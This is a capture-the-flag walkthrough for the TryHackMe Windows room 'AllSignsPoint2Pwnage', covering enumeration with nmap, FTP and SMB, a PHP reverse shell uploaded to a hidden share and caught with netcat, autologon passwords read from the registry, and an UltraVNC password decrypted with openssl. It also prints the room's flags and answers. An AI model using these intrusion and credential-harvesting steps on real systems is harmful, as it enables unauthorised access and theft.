<h1 align="center">AllSignsPoint2Pwnage</h1>
<p align="center">2025, October 17  &nbsp; .  &nbsp; Hey! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure on my <code>529</code>-day-streak in<a href="https://tryhackme.com"> TryHackMe</a>.<br>A room that contains a rushed Windows based Digital Sign system. Can you breach it? &nbsp;&nbsp;Access it <a href="https://tryhackme.com/room/allsignspoint2pwnage">here</a>.<br><br><img width="1200px" src="https://github.com/user-attachments/assets/9fea8fab-ae6e-404c-a48c-6849966f5a77"></p>




<h2>Task 1 . Enumeration</h2>
<p>Deploy the Virtual Machine and Enumerate it. Please note that it can take upto 5 minutes for the machine to fully boot.</p>

<p><em>Answer the questions below</em></p>

<p>1.1. Deploy the machine.<br>
<code>No answer needed</code></p>

<br>
<p>1.2. How many TCP ports under 1024 are open?<br>
<code>6</code></p>

```bash
:~/AllSignsPoint2Pwage# nmap -sS -sV -vv --top-ports 1024 xx.xxx.xx.xx | grep open
```

<img width="1129" height="344" alt="image" src="https://github.com/user-attachments/assets/cc899d84-5f89-44ac-bd12-ce009505db3a" />

<br>
<br>
<br>
<p>1.3. What is the hidden share where images should be copied to? Hint: <em>Hidden shares in windows end up with a certain symbol</em><br>
<code>images$</code></p>

```bash
:~/AllSignsPoint2Pwage# nmap -sS -sV -vv --top-ports 1024 xx.xxx.xx.xx | grep open
```

<img width="1133" height="340" alt="image" src="https://github.com/user-attachments/assets/a9eeb007-bedc-4434-883e-6ec98c3beeef" />

<br>
<br>
<br>

```bash
:~/AllSignsPoint2Pwage# ftp xx.xxx.xx.xx
```

<img width="1133" height="341" alt="image" src="https://github.com/user-attachments/assets/ce14f423-1702-4541-b2b9-1537b5969888" />

<br>
<br>
<br>

```bash
:~/AllSignsPoint2Pwage# cat notice.txt
NOTICE
======

Due to customer complaints about using FTP we have now moved 'images' to 
a hidden windows file share for upload and management 
of images.

- Dev Team
```
<br>

```bash
:~/AllSignsPoint2Pwage# smbclient -L xx.xxx.xx.xx
```

<img width="1130" height="243" alt="image" src="https://github.com/user-attachments/assets/f7cc7694-6f97-4c29-a76f-f343287208f6" />

<br>
<br>
<br>
<h2>Task 2 . Foothold</h2>
<p>Gain a foothold on the box using what you found through enumeration.</p>

<p><em>Answer the questions below</em></p>

<p>2.1. What user is signed into the console session? Hint: <em>On the users desktop</em><br>
<code>sign</code></p>

<br>
<p>2.2. What hidden, non-standard share is only remotely accessible as an administrative account?<br>
<code>installs$</code></p>

<br>
<p>2.3. What is the content of user_flag.txt?<br>
<code>thm{48u51n9_5y573m_func710n4117y_f02_fun_4nd_p20f17}</code></p>

```bash
https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php
```

```bash
:~/AllSignsPoint2Pwage# mv php_reverse_shell.php rev.php
```

```bash
:~/AllSignsPoint2Pwage# nano rev.php
```

<img width="1128" height="353" alt="image" src="https://github.com/user-attachments/assets/02590e29-b2b3-4523-a638-7d666da38c7f" />

<br>
<br>
<br>

```bash
:~/AllSignsPoint2Pwage# smbclient //xx.xxx.xx.xx/images$
```

```bash
smb: \> put rev.php
putting file rev.php as \rev.php (16.9 kb/s) (average 16.9 kb/s)
```

<img width="1129" height="311" alt="image" src="https://github.com/user-attachments/assets/473b84fe-5d72-41aa-a017-b122a5f8613d" />

<br>
<br>
<br>

<img width="1130" height="389" alt="image" src="https://github.com/user-attachments/assets/40cfa24c-6b95-4a6e-b7b8-fa1ef33e9a76" />

<br>
<br>
<br>

```bash
:~/AllSignsPoint2Pwage# nc -nlvp 1234
...
C:\xampp\htdocs\images>
```

```bash
C:\xampp\htdocs\images>whoami
desktop-997gg7d\sign
```

```bash
C:\xampp\htdocs\images>net share

Share name   Resource                        Remark

-------------------------------------------------------------------------------
C$           C:\                             Default share                     
images$      C:\xampp\htdocs\images          Caching disabled
Installs$    C:\Installs                     Caching disabled
IPC$                                         Remote IPC                        
ADMIN$       C:\Windows                      Remote Admin                      
Users        C:\Users                        
The command completed successfully.
```

```bash
C:\xampp\htdocs\images>cd C:\Users\sign

C:\Users\sign>dir
 Volume in drive C has no label.
 Volume Serial Number is 481F-824B

 Directory of C:\Users\sign

26/01/2021  19:19    <DIR>          .
26/01/2021  19:19    <DIR>          ..
26/01/2021  19:28    <DIR>          3D Objects
26/01/2021  19:28    <DIR>          Contacts
26/01/2021  19:28    <DIR>          Desktop
26/01/2021  19:28    <DIR>          Documents
26/01/2021  19:28    <DIR>          Downloads
26/01/2021  19:28    <DIR>          Favorites
26/01/2021  19:28    <DIR>          Links
26/01/2021  19:28    <DIR>          Music
01/02/2021  17:23    <DIR>          OneDrive
26/01/2021  19:28    <DIR>          Pictures
26/01/2021  19:28    <DIR>          Saved Games
26/01/2021  19:28    <DIR>          Searches
26/01/2021  19:28    <DIR>          Videos
               0 File(s)              0 bytes
              15 Dir(s)  17,204,494,336 bytes free
```


<br>

<img width="1128" height="712" alt="image" src="https://github.com/user-attachments/assets/6949947a-6a3a-4715-a7b0-73e83c22d246" />

<br>
<br>
<br>

```bash
C:\Users\sign>cd Desktop
```

```bash
C:\Users\sign\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 481F-824B

 Directory of C:\Users\sign\Desktop

26/01/2021  19:28    <DIR>          .
26/01/2021  19:28    <DIR>          ..
14/11/2020  14:15             1,446 Microsoft Edge.lnk
14/11/2020  15:32                52 user_flag.txt
               2 File(s)          1,498 bytes
               2 Dir(s)  17,250,885,632 bytes free
```

```bash
C:\Users\sign\Desktop>type user_flag.txt
thm{48u51n9_5y573m_func710n4117y_f02_fun_4nd_p20f17}
```

<br>
<h2>Task 3 . Pwnage</h2>
<p>Find the passwords and Admin Flag</p>

<p><em>Answer the questions below</em></p>

<p>3.1. What is the Users Password? Hint: <em>The user is automatically logged into the computer</em><br>
<code>gKY1uxHLuU1zzlI4wwdAcKUw35TPMdv7PAEE5dAFbV2NxpPJVO7eeSH</code></p>


```bash
C:\>reg query "HKLM\Software\Microsoft\Windows NT\Currentversion\winlogon"
```

<img width="1200" height="732" alt="image" src="https://github.com/user-attachments/assets/471f2cc9-cb3d-4324-b4e3-4198c3d9afb9" />

<br>
<br>
<br>
<p>3.2. What is the Administrators Password?<br>
<code>RCYCc3GIjM0v98HDVJ1KOuUm4xsWUxqZabeofbbpAss9KCKpYfs2rCi</code></p>

```bash
C:\Installs>type Install_www_and_deploy.bat
```

<img width="1197" height="601" alt="image" src="https://github.com/user-attachments/assets/ddf61a73-8930-45cd-8f87-5226036baa8d" />

<br>
<br>
<br>
<p>3.3. What executable is used to run the installer with the Administrator username and password? Hint: <em>CaSesensitive.exe</em><br>
<code>PsExec.exe</code></p>

<img width="1199" height="601" alt="image" src="https://github.com/user-attachments/assets/9bc9e454-9c1f-49ef-a9be-56b2e6419f85" />

<br>
<br>
<br>
<p>3.4. What is the VNC Password? Hint: <em>There are a few versions but some do not work. The version here is known to work: http://aluigi.altervista.org/pwdrec.htm</em><br>
<code>5upp0rt9</code></p>

```bash
C:\>cd Program Files
```

```bash
C:\Program Files>cd uvnc bvba
```

<br>

<img width="1194" height="717" alt="image" src="https://github.com/user-attachments/assets/a706428d-62d9-4fb1-bf2f-c7f3924e83ea" />

<br>
<br>
<br>

```bash
C:\Program Files\uvnc bvba>cd UltraVNC
```

```bash
C:\Program Files\uvnc bvba>cd UltraVNC
```

```bash
C:\Program Files\uvnc bvba\UltraVNC>type ultravnc.ini
```

<img width="1204" height="409" alt="image" src="https://github.com/user-attachments/assets/8b78f06a-54f3-43f8-a328-ec4afb9faa78" />

```bash
:~/AllSignsPoint2Pwage# echo -n B3A8F2D8BEA2F1FA70 | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv
```

<img width="1308" height="140" alt="image" src="https://github.com/user-attachments/assets/3724e9e3-42c4-4e4f-8232-6c0c1ff574a7" />


<br>
<br>
<br>
<p>3.5. What is the contents of the admin_flag.txt? Hint: <em>On the users desktop</em><br>
<code>thm{p455w02d_c4n_83_f0und_1n_p141n_73x7_4dm1n_5c21p75}</code></p>


<p>will add steps performed</p>


<br>
<h2>Task 4 . Finishing Up</h2>
><p>There are many ways and tools to complete this room and Windows Defender does add to the fun (?). kudo's if you managed to deploy a payload that evaded Defender to get a shell. Hopefully running through this box you have learnt something that you can use in future.<br>

I would like to thank BigMark82 and RockShox my partners in crime. Also a shout out to elbee for encouraging me to make a room, check out their room StartUp which was fun to do.</p>

<p><em>Answer the question below</em></p>

<p>4.1.READ IT<br>
<code>No answer needed</code></p>

<br>
<br>
<br>



<img width="1907" height="895" alt="image" src="https://github.com/user-attachments/assets/e0a40a03-5714-4e44-a940-4d2b3c4cfed9" />

<img width="1906" height="887" alt="image" src="https://github.com/user-attachments/assets/e31f469c-9ae4-4b92-9764-8665004bac27" />

131,186  |  1005

<img width="329" height="88" alt="image" src="https://github.com/user-attachments/assets/2418b717-6bd6-4676-8243-ed14ea6c6223" />



<img width="1897" height="890" alt="image" src="https://github.com/user-attachments/assets/52512f16-e65f-4dbd-aebd-726697bdd1ce" />


<img width="1892" height="891" alt="image" src="https://github.com/user-attachments/assets/37f915af-1521-419f-a2fa-ee8b72645f22" />

<img width="1888" height="891" alt="image" src="https://github.com/user-attachments/assets/c907ea48-4c47-421c-bfb8-49dfcdebf73f" />



<img width="1894" height="895" alt="image" src="https://github.com/user-attachments/assets/3710a490-8a90-495a-8eb7-ef2001aa1279" />






